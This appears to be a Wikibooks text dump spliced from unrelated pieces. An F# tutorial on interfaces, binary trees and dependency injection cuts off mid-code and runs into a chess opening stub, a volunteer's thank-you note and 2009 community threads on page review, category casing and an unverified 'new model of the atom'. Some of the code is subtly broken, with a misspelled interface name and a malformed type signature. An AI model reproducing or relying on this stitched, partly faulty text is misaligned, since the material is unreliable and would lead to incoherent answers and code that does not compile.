sortAndPrint &quot;name&quot; people { new IComparer&lt;person&gt; with member this.Compare(x, y) = x.name.CompareTo(y.name) }

(* sorting by name descending *)
sortAndPrint &quot;name desc&quot; people { new IComparer&lt;person&gt; with member this.Compare(x, y) = y.name.CompareTo(x.name) };;

type person =
  {name: string;
   age: int;}
val people : person array
val sortAndPrint : string -&gt; person array -&gt; IComparer&lt;person&gt; -&gt; unit

age: (Larry, 20) (Curly, 25) (Moe, 30) 
name: (Curly, 25) (Larry, 20) (Moe, 30) 
name desc: (Moe, 30) (Larry, 20) (Curly, 25)
&lt;/source&gt;

=== Implementing Multiple Interfaces ===
Unlike inheritance, its possible to implement multiple interfaces:

&lt;source lang=&quot;ocaml&quot;&gt;
open System

type Person(name : string, age : int) = 
    member this.Name = name
    member this.Age = age
    
    (* IComparable is used for ordering instances *)
    interface IComparable&lt;Person&gt; with
        member this.CompareTo(other) =
            (* sorts by name, then age *)
            match this.Name.CompareTo(other.Name) with
            | 0 -&gt; this.Age.CompareTo(other.Age)
            | n -&gt; n
    
    (* Used for comparing this type against other types *)
    interface IEquatable&lt;string&gt; with
        member this.Equals(othername) = this.Name.Equals(othername)
&lt;/source&gt;

Its just as easy to implement multiple interfaces in object expressions as well.

=== Interface Hierarchies ===

Interfaces can extend other interfaces in a kind of interface hierarchy. For example:

&lt;source lang=&quot;ocaml&quot;&gt;
type ILifeForm =
    abstract member location : System.Drawing.Point

type 'a IAnimal =   (* interface with generic type parameter *)
    inherit ILifeForm
    inherit System.IComparable&lt;'a&gt;
    abstract member speak : unit -&gt; unit
    
type IFeline =
    inherit IAnimal&lt;IFeline&gt;
    abstract member purr : unit -&gt; unit
&lt;/source&gt;

When users create a concrete implementation of &lt;code&gt;IFeline&lt;/code&gt;, they are required to provide implementations for all of the methods defined in the &lt;code&gt;IAnimal&lt;/code&gt;, &lt;code&gt;IComparable&lt;/code&gt;, and &lt;code&gt;ILifeForm&lt;/code&gt; interfaces.

: '''Note:''' Interface hierarchies are occasionally useful, however deep, complicated hierarchies can be cumbersome to work with.

== Examples ==
=== Generalizing a function to many classes ===

&lt;source lang=&quot;ocaml&quot;&gt;
open System
type ILifeForm =
    abstract Name : string
    abstract Speak : unit -&gt; unit
    abstract Eat : unit -&gt; unit
    
type Dog(name : string, age : int) =
    member this.Age = age

    interface ILifeForm with
        member this.Name = name
        member this.Speak() = printfn &quot;Woof!&quot;
        member this.Eat() = printfn &quot;Yum, doggy biscuits!&quot;
        
type Monkey(weight : float) =
    let mutable _weight = weight
    
    member this.Weight
        with get() = _weight
        and set(value) = _weight &lt;- value
        
    interface ILifeForm with
        member this.Name = &quot;Monkey!!!&quot;
        member this.Speak() = printfn &quot;Ook ook&quot;
        member this.Eat() = printfn &quot;Bananas!&quot;
        
type Ninja() = 
    interface ILifeForm with
        member this.Name = &quot;Ninjas have no name&quot;
        member this.Speak() = printfn &quot;Ninjas are silent, deadly killers&quot;
        member this.Eat() =
            printfn &quot;Ninjas don't eat, they wail on guitars because they're totally sweet&quot;

let lifeforms =
    [(new Dog(&quot;Fido&quot;, 7) :&gt; ILifeForm);
     (new Monkey(500.0) :&gt; ILifeForm);
     (new Ninja() :&gt; ILifeForm)]            

let handleLifeForm (x : ILifeForm) =
    printfn &quot;Handling lifeform '%s'&quot; x.Name
    x.Speak()
    x.Eat()
    printfn &quot;&quot;
    
let main() =
    printfn &quot;Processing...\n&quot;
    lifeforms |&gt; Seq.iter handleLifeForm
    printfn &quot;Done.&quot;
    
main()&lt;/source&gt;

This program has the following types:

&lt;source lang=&quot;ocaml&quot;&gt;
type ILifeForm =
  interface
    abstract member Eat : unit -&gt; unit
    abstract member Speak : unit -&gt; unit
    abstract member Name : string
  end

type Dog =
  class
    interface ILifeForm
    new : name:string * age:int -&gt; Dog
    member Age : int
  end

type Monkey =
  class
    interface ILifeForm
    new : weight:float -&gt; Monkey
    member Weight : float
    member Weight : float with set
  end

type Ninja =
  class
    interface ILifeForm
    new : unit -&gt; Ninja
  end

val lifeforms : ILifeForm list
val handleLifeForm : ILifeForm -&gt; unit
val main : unit -&gt; unit
&lt;/source&gt;

This program outputs the following:

&lt;pre&gt;
Processing...

Handling lifeform 'Fido'
Woof!
Yum, doggy biscuits!

Handling lifeform 'Monkey!!!'
Ook ook
Bananas!

Handling lifeform 'Ninjas have no name'
Ninjas are silent, deadly killers
Ninjas don't eat, they wail on guitars because they're totally sweet

Done.&lt;/pre&gt;

=== Using interfaces in generic type definitions ===
We can constrain generic types in class and function definitions to particular interfaces. For example, let's say that we wanted to create a binary tree which satisfies the following property: each node in a binary tree has two children, &lt;code&gt;left&lt;/code&gt; and &lt;code&gt;right&lt;/code&gt;, where all of the child nodes in &lt;code&gt;left&lt;/code&gt; are less than all of its parent nodes, and all of the child nodes in &lt;code&gt;right&lt;/code&gt; are greater than all of its parent nodes.

We can implement a binary tree with these properties defining a binary tree which constrains our tree to the &lt;code&gt;IComparable&lt;T&gt;&lt;/code&gt; interface.

: '''Note:''' .NET has a number of interfaces defined in the BCL, including the very important &lt;code&gt;[http://msdn.microsoft.com/en-us/library/4d7sx9hd.aspx IComparable&lt;T&gt; interface]&lt;/code&gt;. IComparable exposes a single method, [http://msdn.microsoft.com/en-us/library/43hc6wht.aspx objectInstance.CompareTo(otherInstance)]&lt;/code&gt;, which should return 1, -1, or 0 when the &lt;code&gt;objectInstance&lt;/code&gt; is greater than, less than, or equal to &lt;code&gt;otherInstance&lt;/code&gt; respectively. Many classes in the .NET framework already implement IComparable, including all of the numeric data types, strings, and datetimes.

For example, using fsi:

&lt;source lang=&quot;ocaml&quot;&gt;
&gt; open System

type tree&lt;'a&gt; when 'a :&gt; IComparable&lt;'a&gt; =
    | Nil
    | Node of 'a * 'a tree * 'a tree

let rec insert (x : #IComparable&lt;'a&gt;) = function
    | Nil -&gt; Node(x, Nil, Nil)
    | Node(y, l, r) as node -&gt;
        if x.CompareTo(y) = 0 then node
        elif x.CompareTo(y) = -1 then Node(y, insert x l, r)
        else Node(y, l, insert x r)
        
let rec contains (x : #IComparable&lt;'a&gt;) = function
    | Nil -&gt; false
    | Node(y, l, r) as node -&gt;
        if x.CompareTo(y) = 0 then true
        elif x.CompareTo(y) = -1 then contains x l
        else contains x r;;

type tree&lt;'a&gt; when 'a :&gt; IComparable&lt;'a&gt;&gt; =
  | Nil
  | Node of 'a * tree&lt;'a&gt; * tree&lt;'a&gt;
val insert : 'a -&gt; tree&lt;'a&gt; -&gt; tree&lt;'a&gt; when 'a :&gt; IComparable&lt;'a&gt;
val contains : #IComparable&lt;'a&gt; -&gt; tree&lt;'a&gt; -&gt; bool when 'a :&gt; IComparable&lt;'a&gt;

&gt; let x =
    let rnd = new Random()
    [ for a in 1 .. 10 -&gt; rnd.Next(1, 100) ]
    |&gt; Seq.fold (fun acc x -&gt; insert x acc) Nil;;

val x : tree&lt;int&gt;

&gt; x;;
val it : tree&lt;int&gt;
= Node
    (25,Node (20,Node (6,Nil,Nil),Nil),
     Node
       (90,
        Node
          (86,Node (65,Node (50,Node (39,Node (32,Nil,Nil),Nil),Nil),Nil),Nil),
        Nil))

&gt; contains 39 x;;
val it : bool = true

&gt; contains 55 x;;
val it : bool = false
&lt;/source&gt;

=== Simple dependency injection ===
Dependency injection refers to the process of supplying an external dependency to a software component. For example, let's say we had a class which, in the event of an error, sends an email to the network administrator, we might write some code like this:

&lt;source lang=&quot;ocaml&quot;&gt;
type Processor() =
    (* ... *)
    member this.Process items =
        try
            (* do stuff with items *)
        with
            | err -&gt; (new Emailer()).SendMsg(&quot;admin@company.com&quot;, &quot;Error! &quot; + err.Message)
&lt;/source&gt;

The &lt;code&gt;Process&lt;/code&gt; method creates an instance of &lt;code&gt;Emailer&lt;/code&gt;, so we can say that the &lt;code&gt;Processor&lt;/code&gt; class ''depends'' on the &lt;code&gt;Emailer&lt;/code&gt; class.

Let's say we're testing our &lt;code&gt;Processor&lt;/code&gt; class, and we don't want to be sending emails to the network admin all the time. Rather than comment out the lines of code we don't want to run while we test, its much easier to substitute the &lt;code&gt;Emailer&lt;/code&gt; dependency with a dummy class instead. We can achieve that by passing in our dependency through the constructor:

&lt;source lang=&quot;ocaml&quot;&gt;
type IFailureNotifier =
    abstract Notify : string -&gt; unit

type Processor(notifier : IFailureNotifier) =
    (* ... *)
    member this.Process items =
        try
            // do stuff with items
        with
            | err -&gt; notifier.Notify(err.Message)

(* concrete implementations of IFailureNotifier *)

type EmailNotifier() =
    interface IFailureNotifier with
        member Notify(msg) = (new Emailer()).SendMsg(&quot;admin@company.com&quot;, &quot;Error! &quot; + msg)
        
type DummyNotifier() =
    interface IFailureNotifier with
        member Notify(msg) = () // swallow message
        
type LogfileNotifier(filename : string) =
    interface IFailureNotifer with  
        member Notify(msg) = System.IO.File.AppendAllText(filename, msg)
&lt;/source&gt;

Now, we create a processor and pass in the kind of FailureNotifier we're interested in. In test environments, we'd use &lt;code&gt;new Processor(new DummyNotifier())&lt;/code&gt;; in production, we'd use &lt;code&gt;new Processor(new EmailNotifier())&lt;/code&gt; or &lt;code&gt;new Processor(new LogfileNotifier(@&quot;C:\log.txt&quot;))&lt;/code&gt;.

To demonstrate dependency injection using a somewhat contrived example, the following code in fsi shows how to hot swap one interface implementation with another:

&lt;source lang=&quot;ocaml&quot;&gt;
&gt; #time;;

--&gt; Timing now on

&gt; type IAddStrategy =
    abstract add : int -&gt; int -&gt; int
    
type DefaultAdder() =
    interface IAddStrategy with
        member this.add x y = x + y
        
type SlowAdder() = 
    interface IAddStrategy with
        member this.add x y =
            let rec loop acc = function
                | 0 -&gt; acc
                | n -&gt; loop (acc + 1) (n - 1)
            loop x y

=Queen's Gambit Declined=
===3...c6===
{{ChessStub}}
In this position, by delaying Nf6, Black keeps many opportunities open. He can keep on playing in the normal Queen's Gambit Declined (QGD) fashion with 4...Nf6 (whether white plays e3 or Nf3), or can try different other options. 

4.Nf3 can lead to regular QGD games or, for example, the Noteboom variation : 4...dxc4. Here, Black aims to get two passed flanked pawns in exchange for White's big center. The middlegame is critical, but if Black survives, then the endgame is favorable for him. 

On the other hand 4.e3 can lead to a stonewall defense position with 4...f5, where Black's usual plan is a quick attack on the king side and can often involve a rook lift to f6.

Another option for White, though less popular, is the Marshall Gambit of the Semi-Slav, with 4.e4. This move aims at exploiting Black's lack of control of e4, not having played Nf6. Main line goes 4...dxe4 5.Nxe4 Bb4+ 6.Bd2 Qxd4 7.Bxb4 Qxe4+ with a sharp game. Usually White blocks with Be2 and leaves the g2 pawn hanging. Black can capture it, but not the rook (Bf3 wins the queen). In return, White can have annoying pressure and tactics involving the d6 weakness. A recent game played in this line is Bacrot - Morozevich, Biel Rd2, 2012.

      <text xml:space="preserve">I am a retired Police Officer. As an Officer I maintained the computers running and maintained them in great working order.
Being retired now I find I have a lot of time on my hands and decided to teach computer literacy to Seniors at the Local community center 3 days a week for a total of six to seven hours weekly. This is on volatary basis as they are non profit and could not afford my fees. So out of the kindness of my heart I've purchased printers that needed and tried to aquire computers from corporations and others who would be willing to donate for the use of the Seniors. 
The center Director is happy with my group who make signs and posters and all we are allowed to ask for are ink, paper and the space or classroom. And now I am very happy to have found this site to get materials to teach.
Thank you,

== attention required ==

Can someone here look at [[Cookbook:Placenta_with_Broccoli]]. It's in a [http://blogs.riverfronttimes.com/stlog/2009/03/placenta_for_lunch.php blogpost], and I'm a tad worried about potential health issues that the current article does not warn of. Next to that, it's also a tad distasteful to a rather large portion of the world I guess, and lastly, it might be a press magnet if that blog posting gets more attention. Someone should review what to do about this. [[Special:Contributions/82.75.218.92|82.75.218.92]] ([[User talk:82.75.218.92|talk]]) 00:57, 3 March 2009 (UTC)

:Thanks for raising this concern. I'm afraid Wikibooks is not censored, so it won't be removed on grounds of taste. The content is all created by volunteers, so if someone adds information on any valid health concerns then that's great. Until they do so, it'll probably just stay the way it is. &lt;font color=&quot;#E66C2C&quot;&gt;[[User:QuiteUnusual|'''Unusual? Quite''']]&lt;/font&gt; &lt;sup&gt;&lt;font color=&quot;#306754&quot;&gt;[[User talk:QuiteUnusual|TalkQu]]&lt;/font&gt;&lt;/sup&gt; 08:40, 3 March 2009 (UTC)

== Top-of-the-page notices ==

For a while now I've been thinking how very useful it would be to be able to get out news to the greater community on several issues. I've seen Wikiversity place notices at the top of the page (presumably the same way [[User:WikimediaNotifier]] does). Does anyone have objections to this or have a better suggestion? If not, where do we set these messages? --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 07:01, 2 March 2009 (UTC)

:No objections from me. [[User:Thenub314|Thenub314]] ([[User talk:Thenub314|talk]]) 10:30, 4 March 2009 (UTC)

== Linking to Windows exectutables ==

There's a link on [[Arabic/LearnRW#Downloads]] that goes directly to an &lt;tt&gt;.exe&lt;/tt&gt; file on a foreign website. I think these sort of links should have big warning messages since these executables could contain malware. -[[User:Alan Trick|Alan Trick]] ([[User talk:Alan Trick|talk]]) 19:41, 2 March 2009 (UTC)

:You can fix the link yourself, it points to what seems to be a demo version (until registered) of the program. A better link would be the main site or the page advertising the program itself, as it is I doubt that it is malware but is not very useful either...  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 20:07, 3 March 2009 (UTC)
== use of French accents on capital letters ==

I would like to know if it is correct to use French accents on capital letters at the beginning of a word or sentence, and whether they are used on capitals at the beginning of a name e.g. École des Hautes Études. Thanks
: It is correct, however in practice they are often left out. [[User:Junesun|Junesun]] ([[User talk:Junesun|talk]])
: To elaborate, L'académie française states in their [http://www.academie-francaise.fr/langue/questions.html#accentuation FAQ] that it is preferred, but that it is acceptable to leave them out. --[[User:Alan Trick|Alan Trick]] ([[User talk:Alan Trick|talk]]) 17:49, 2 March 2009 (UTC)

== Introduction to Myself and A New Visualization of The Atom ==

Hi everyone. I wrote the WikiBook [[A_New_Model_of_the_Atom]] last year. It's A New Visualization of The Atom. A new way to view, teach, and understand the basics of atoms, and how they interact to form molecules. I didn't introduce myself earlier as I'm just now learning my way around Wiki. Previously, I didn't know that I could or should introduce myself. I am an electrical engineer by training and a Wannabe Renaissance Man by armchair. Originally from Northern Virginia, I moved to the Silicon Valley 25+ years ago to work and raise my family. My kids think my knowledge is like an ocean that covers the earth. But, I'll add that such a notion is a shallow ocean.
   
As my kids (they are twins) went through school they had a lot of trouble understanding the atom. They found my explanations made this difficult subject much more comprehensible than what they received in science class. Once I got my analogy of atomic theory into the heads of my children, they could “see” how pressure and heat can turn carbon to diamond, why the transformation increases carbon’s density, and why the diamond bonds are so strong. They can now understand the chemistry of why mayonnaise emulsifies oil with vinegar. I didn’t get that understanding from 8th grade science and chemistry, nor even high school. They were often far ahead of their classmates in many areas of middle and high school. From a class of 900, I like to think I had something to do with the payoff of watching them walk to the podium to receive awards as their names were announced 21 times from the graduation program pamphlet. Now in college, they have told me that my explanations, on a multitude of subjects, have often placed them significantly ahead of classmates. They ask me to write a book, so this is its beginning.

[[A_New_Model_of_the_Atom]] is intended for intermediate and high school students (or any non-physicist adult) desiring a better understanding of atoms and how they create molecules. I welcome constructive criticism. Please let me know if parts are unclear or need expansion. If readers find it useful, I'll add more ways to understand some complex issues without math. I'd like to expand upon the duality of light and add some drawings to the &quot;Double-Slit&quot; experiment. Some other possible subjects include:
 
:&quot;How Neutrinos Can Travel Through a Wall of Lead One Light Year Thick&quot; 
:&quot;How a Teaspoon of Neutrons can Weigh 1 Billion Tons&quot;
:&quot;How Dark Matter and Dark Energy Could Give Shape to the Cosmos&quot;
:&quot;Why One Cannot Make an Electrical Generator Big Enough to Run an Electric Motor to Run the Generator&quot;

Please leave comments at [[Talk:A_New_Model_of_the_Atom]]&amp;nbsp; &lt;&lt; '''Pcfjr9''' &amp;nbsp;([[User:Pcfjr9|Page]])&amp;nbsp;  &lt;&lt; [[User:Pcfjr9|Pcfjr9]] ([[User talk:Pcfjr9|talk]]) 21:49, 22 March 2009 (UTC)
== Reviewing Wikijunior pages ==

For most books, it makes sense to me that stub pages (at least) would be unreviewed.  If casual vandalism occasionally crops up, well, we're adults (or are choosing to operate in that mode), we can shake our heads at the foolhardiness of people who waste their time on earth doing such things, clean up the mess, and go on with our business.  However, I do think wikijunior ought to be more resistant to casual vandalism.  (Note the repellent notice currently at the top of the [[Wikijunior|wikijunior main page]].)  I don't see any separate rule for wikijunior, to the effect that even developing pages should be reviewed as minimally acceptable (regardless of whether they meet the [[Using Wikibooks/Reviewing Pages#Page Criteria|acceptability criteria]]); but it seems to me this should be a specifically acknowledged exception to the usual criteria.  --[[User:Pi zero|Pi zero]] ([[User talk:Pi zero|talk]]) 14:30, 1 February 2009 (UTC)

: While I agree that this can be a problem, I'm not sure where exactly you're going with this. Are you asking for help to do a once-over review of Wikijunior?
: As for that notice on the Wikijunior main page which advises readers not to log in, they can also change a setting in their preferences (stability tab) to always show the stable version if it exists. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 03:57, 2 February 2009 (UTC)

:::What I have in mind is something other than the mere amount of work involved, although I certainly wouldn't want to discourage others pitching in to help.  I'll try to be clearer.  As I read the acceptability criteria, ''any'' page can be straightforwardly upgraded to acceptable composition and accuracy; that's just good spelling and grammar, and truth or partial truth.  Even if you're not sure what a problem passage was supposed to mean, it should be pretty easy to replace it with something (or sometimes with nothing) that at least meets those criteria.  However, upgrading some pages to acceptable ''coverage'' would require adding more material.  I believe it ought to be possible for wikijunior books to contain stub pages, which more-or-less by definition have not yet achieved acceptable coverage &amp;mdash; and at the same time I believe '''all''' wikijunior pages should always have a reviewed version, so that casual vandalism will not instantly appear on the default page.  I'm proposing that
:::*there should be an exception to the acceptable coverage criterion to allow wikijunior pages to be reviewed as having acceptable coverage even if they're stubs, and while we're at it
:::*there ought to be an explicit statement somewhere that wikijunior pages should be brought up to acceptable review status promptly, preferably before their link to the book's main page is reviewed.
:::Alternatively, perhaps the acceptable coverage criterion is meant to be weaker than I'm reading it to be, in which case the fact that I've misunderstood it suggests that some rephrasing of the criterion is in order.  --[[User:Pi zero|Pi zero]] ([[User talk:Pi zero|talk]]) 13:02, 2 February 2009 (UTC)

::::Looking at [[Help:Revision review]], the acceptable coverage criterion stated there ''does'' look enormously weaker than what I was going by &amp;mdash; presumably my difficulty was because I was working off of the version at Using Wikibooks, which is much stronger (on a relative scale).  The question then becomes, which version of the criterion is more &quot;official&quot;?  --[[User:Pi zero|Pi zero]] ([[User talk:Pi zero|talk]]) 13:25, 2 February 2009 (UTC)

::::: I'd say that the help and project namespaces should be considered the official version. This whole thing is very new, however, and as such is still in flux as we decide what these things should mean.
::::: While there is a notice up top, alerting users that modules are unreviewed. I can see your viewpoint about the special nature of Wikijunior and guess we wouldn't want readers' guardians feeling that users might be stumbling onto something they consider offensive. I suggest we just interpret &quot;acceptable&quot; as acceptable enough to justify the sighting in light of the audience. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 22:08, 2 February 2009 (UTC)

:: Feel free to clarify the &quot;repellent&quot; note. And yes, I think such a repellent note is needed. Otherwise Wikijunior's reputation (and maybe also Wikibooks' reputation) will seriously suffer when parents realize what images are used for vandalism. (Imagine a mass media article with one of these images.) --[[User:Martin Kraus|Martin Kraus]] ([[User talk:Martin Kraus|talk]]) 09:47, 2 February 2009 (UTC)

:::I mean that the notice repels potential readers.  It's scarcely short of &quot;Go away!&quot;  And although I'm sure it's not perfectly worded (Swift makes a good point about default settings), I wasn't criticizing its content.  I'm lamenting that there is cause for it.  After giving some thought to how it might be rephrased, I decided that I was going at the problem from the wrong end.  As long as there are unreviewed pages on wikijunior, that heightens the severity of warning that's called for.  '''If''' every single page on all of wikijunior had a reviewed version, then I think we could make that notice considerably smaller and less... repellent.  So I started reviewing pages.  As I've slowly worked my way into the task, I've observed this matter of acceptable coverage that seemed like it ought to be clarified.  --[[User:Pi zero|Pi zero]] ([[User talk:Pi zero|talk]]) 13:02, 2 February 2009 (UTC)

:::: I agree that the notice is warranted in the case of Wikijunior, but I see it as a great tool not to repel, but draw in new users. I think that rather than the current negative &quot;beware of bad content&quot; we should have a positive &quot;stable versions (of reviewed pages) are served to ensure quality&quot;. I'll be bold later today if no-one beats me to it. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 22:08, 2 February 2009 (UTC)

I've just finished going through [[Wikijunior:Big Cats]] reviewing all the pages.  I corrected some grammar and made a few other tweaks here and there as I went too, so I think the book is better for my efforts.  The book could still us more attention though - it needs to standardize the way it shows measurements.  Sometimes they are in metric, sometimes they are in English, sometimes both (but in both orders).  Also I didn't start correcting the capitalization of cat names (i.e., &quot;The Lynx is a cat&quot; -&gt; &quot;The lynx is a cat&quot;) until I was pretty far into it, and I didn't go back and check the earlier pages.  So there's still plenty that could be done to improve this wonderful book. I encourage other Wikibookians to adopt a Wikijunior book and do the same.  IMO, we should start with the featured books, as I assume those get the most traffic, and those books that are frequent vandalism targets, as the project stands to benefit the most from having reviewed versions of those pages. --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 03:32, 6 February 2009 (UTC)

: No promises, but I'll try to have a run-through the [[Wikijunior:How Things Work]] book. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 05:45, 6 February 2009 (UTC)

:: I've just finished going through [[Wikijunior:The Elements]].  Elapsed time from start to finish was about a week.  --[[User:Pi zero|Pi zero]] ([[User talk:Pi zero|talk]]) 20:59, 6 February 2009 (UTC)
:::Yeah, I noticed you were going through it.  Thanks! --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 23:40, 6 February 2009 (UTC)

::I'm working off the unreviewed pages list now to try and get through the back of this. There are only about 600 pages need reviewing, so it should be possible to get there in a few weeks or less. &lt;font color=&quot;#E66C2C&quot;&gt;[[User:QuiteUnusual|'''Unusual?

:::So, pretty much done (around 95%), and will be finished in a day or so. I can't speak to the quality of most of the modules - many are very light on detail - but bad spelling and awful grammar as well as obvious nonsense have been removed. All vandalism cleaned off and each module sighted. Some are just stubs, but at least a WJ reader with the right settings is now guaranteed a vandalism free page.

== Watchlist question ==

Maybe this is really a question for assistance, but here goes anyways.  Is there a way to add all submodules of an existing book to my watch list with out going through them one by one and adding them? [[User:Thenub314|Thenub314]] ([[User talk:Thenub314|talk]]) 11:42, 18 February 2009 (UTC)

:Sorry for taking so long to answer your question! This is a very common question, but unfortunately the answer is no. There is no way to automatically add these pages to your watchlist all at once. You can go though the list manually and add them. Or, you can use the page [[Special:RecentChangesLinked]] to view all the changes made to pages linked from the page, but this doesn't happen in your watchlist, it happens on a separate page. I hope this helps! --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 20:29, 18 February 2009 (UTC)

:You can also update your watch list by going to [[Special:PrefixIndex]] to list all pages starting with the name of the book. You can then cut and paste the page names into your watchlist at [[Special:Watchlist/raw]]. Note, however, that the list of pages at PrefixIndex is in a 3-column format (separated by tabs), but in order to copy the page names to your watchlist, you need to list just one page per line.  You could do this manually in a text editor if there are just a few entries, but if there are several hundred, this could get tedious. One solution is to use your word processor's search and replace feature, replacing tabs with newline characters.

== Response Requested ==

Hi - I wrote the Wikibook: 

[[A New Model of the Atom]] http://en.wikibooks.org/wiki/A_New_Model_of_the_Atom

I received an unfavorable comment and a favorable comment. 

The favorable:

::&quot;A reader requests that this page or book be expanded to include more content...
::Please continue to improve this material, even after this message has been removed...&quot; 

The unfavorable:

::&quot;This book appears to contain original research or unverifiable material. Wikibooks policy requires that all book material here be verifiable. 
::Original research and unsupported claims are not acceptable here. Such material might be suitable at Wikiversity instead.
::If this material is not original research, or if it has been fixed to be properly cited and verifiable, this template may be removed. 
::For help, see WB:CHAT.&quot;

Most people have no idea how the atom &quot;works&quot; or how atoms link together becoming molecules. [[A New Model of the Atom]] is my original, intellectual proposal of explaining sub-atomic and molecular structure in a manner comprehensible to average Intermediate School, High School, and non-science Undergraduate Students. I believe my approach is superior to how atomic theory was presented to me in High School (it was incomprehensible). I am encouraged that &quot;A reader requests that this page or book be expanded...&quot; and I hope to get feedback from additional junior scientist.

I do make some claims for which I have not the tools to verify, but I suggest some ways they may be verified. If others can show my claims are impossible, then I will remove them. If they cannot disprove my claims, then I suggest we have found a viable point of controversy worth exploring. For thousands of years people believed the world was flat and displayed much hostility to a helio-centric universe. Today's scientists have 80+ years invested in current quantum atomic theory. They have a lot to lose. The more hostile they are to a new idea, without being able to disprove it, the more that new idea should be explored. Overall, my model does not upset the larger view of current theory. And, I don't believe I should be placed under &quot;house arrest&quot; just because it does not conform to the deeper parts of quantum mechanics, unless my detractors can supply contrary proof. Even then, my model may still prove a better introductory tool than current models.

However, given my arguments, if part of them do not conform to the WikiBook Guidelines, then advise me of which parts to remove and I shall.

If I have placed my ideas in the wrong Wiki, then please advise where it should be and I will move it.

== Subject category case ==

Various Wikibookians have been implementing different casing schemes for subject categories. There was a discussion on this at [[Subject talk:Major Subjects]] and I updated [[Wikibooks:Subject pages]] with directions to use sentence case and the rationale. Essentially, book categories (tend to?) use title case so using sentence case helps avoid conflicts where possible.

In the interest of getting the word out there and soliciting comments, I'd like to bring this here. Please discuss away. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 15:03, 21 March 2009 (UTC)

: I am definitely in favor of Title Casing for subjects, as I think of these of subjects as having proper names.  I appreciate the difficulty that you may end up with a subject and book that have the same name, but there is no restriction that the category for the pages of the book needs to have the same name as the book itself.  These conflicts could be resolved in other ways.  On a related note, we should find a consistent way to resolve these conflicts anyways.  I quickly found the Algebra textbook conflicted with the Algebra subject, and what ever we decide about casing will not fix this,  these types of conflict will always arise.   

: In the end, this would necessitate changing even several top level subjects.  But I suppose that at the heart of issue for me is simply that phrases like &quot;Fine arts&quot; &quot;Social sciences&quot; seem quite out of place to me.  [[User:Thenub314|Thenub314]] ([[User talk:Thenub314|talk]]) 16:49, 21 March 2009 (UTC)

:: To those of the other viewpoint, &quot;Fine Arts&quot; and &quot;Social Sciences&quot; as subjects are out of place. They seem most natural as &quot;fine arts&quot; and &quot;social sciences&quot; to me (the first capital letter has nothing to do with capitalisation schemes). --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 17:13, 21 March 2009 (UTC)

: I like the lowercase scheme and think that there ought to be an option to allow the first character of category names to be case sensitive separate from [[mw:Manual:$wgCapitalLinks|$wgCapitalLinks]], so that both Category:algebra and Category:Algebra can co-exist. Perhaps if there is enough support for this idea, the developers would accept such an option. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 21:25, 21 March 2009 (UTC)

: I agree with [[User:Swift|Swift]] and [[User:Thenub314|Thenub314]] as for the issue of Fine Arts or Social Sciences labels I think it will best used on the subject namespace. Categories should be more strict, in any case when I did attempt to do some work on the subject I attempted to reduce the use of categories to the title of the book (capital) and the foremost related subject on the title page of books all subpages were tagged as belonging only to the book category so the category function performs the function what it has always been used for to provide and alternative navigational scheme for books content, enables the use of the subject namespace without collision of function and an easier maintenance. I have also linked together categories ie: the Programming will have subcategories like C, C++, ASM and other, reducing the need to use generalist categories like the above mentioned Fine Arts or Social Sciences. But without a proper guideline doing work on that namespace is futile...  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 23:51, 21 March 2009 (UTC)
== Helping on the Technical Theatre book. ==

Hello, I was recently reading over the [[Technical Theatre]] wikibook and noticed that it could use a lot of work. 
I found the book to assume the reader already knows basic terminology and concepts. I hope to see the book expanded into a comprehensive textbook. I am a professional stagehand, and would like to see the wikibook become a reference that I can send people new to the trade to for basic education needs.

== Outdated Review backlog ==

A large portion of the outdated reviews appear to be within [[:Category:Foundations_of_Education_and_Instructional_Assessment]] - although we're not supposed to sic bots on them, I'm finding that there's at least a few hundred paged within that category alone, and it may take an automated task to do cleat that to a semi-manageable level.  I think it might be caused by the forced siting of the first revision of a given page, since these pages were created by a mature editor and modified by various students. --[[User:Sigma 7|Sigma 7]] ([[User talk:Sigma 7|talk]]) 05:27, 28 March 2009 (UTC)
== How to read guide ==

I have been writing Wikipedia for about three years now, but have not explored the other projects of the Wikimedia Foundation much. To make a long story short, I woke up this morning wondering if a system could be developed to teach someone to read using pictures and sound files--that is, a human-less teacher. There are books in the works here to teach English as a second language and these are undoubtedly helpful. But if you could sit a person, of any age who cannot read, in front of a computer and teach them to read, then allow them to expand their skills by reading WikiJunior, the Simple English wiki, Simple English Wikictionary, and eventually Wikipedia itself, well, that would be kind of cool. Obviously, there is no substitute for a human teacher, but this could also serve as a lesson plan as well. Is this something that the community would be interested in developing? Thanks! [[User:Blackngold29|Blackngold29]] ([[User talk:Blackngold29|talk]]) 18:31, 28 March 2009 (UTC)

:There is a picture dictionary in the [http://es.wikibooks.org/wiki/Espa%C3%B1ol_/_como_lengua_extranjera_/_Vocabulario Spanish wikibooks project]. Maybe the main challenge for this kind of projects is the lack of sound files. While there are many [http://commons.wikimedia.org/wiki/Category:English_pronunciation sound files] for English, many of them are just names of nations, etc. If you are really interested in doing such a project, I would recommend that you make sure how to create sound files that you might need. I would also suggest that you don't expect a lot of help by other authors; thus, I would recommend that you better start with a small project that you are able to complete alone in case this is necessary. --[[User:Martin Kraus|Martin Kraus]] ([[User talk:Martin Kraus|talk]]) 12:05, 29 March 2009 (UTC)

== Image rollovers ==

Hi, I'm writing a wikibook and think it would be useful as an aid to understanding to be able to change an image slightly when the user moves the mouse over it. I can imagine that this could be useful for other books too (e.g. to make an arrow appear when you mouse over an image, highlighting a particular point). I've hacked an example together using css, but at the moment this requires users to add the following line to their personal css file
 .hoverContainer:hover .hideOnHover {visibility:hidden}
I have three questions about this
